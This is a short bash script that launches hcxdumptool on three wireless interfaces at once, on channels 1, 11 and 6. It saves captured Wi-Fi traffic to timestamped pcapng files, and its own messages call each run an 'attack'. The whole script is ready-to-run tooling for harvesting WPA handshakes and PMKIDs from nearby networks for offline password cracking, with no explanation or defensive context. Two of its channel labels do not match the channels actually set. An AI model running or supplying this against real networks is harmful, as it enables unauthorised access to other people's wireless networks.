#!/bin/bash
now=$(date --iso-8601=ns)
echo 'Starting Ch1 attack'
sudo hcxdumptool -i wlan0 -o $now.pcapng -c 1 --enable_status=31&
now=$(date --iso-8601=ns)
echo 'Starting Ch6 attack'
sudo hcxdumptool -i wlan1 -o $now.pcapng -c 11 --enable_status=31&
now=$(date --iso-8601=ns)
echo 'Starting Ch11 attack'
sudo hcxdumptool -i wlan2 -o $now.pcapng -c 6 --enable_status=31&
sleep 5
echo 'Off to the races'
ps ax|grep hcx
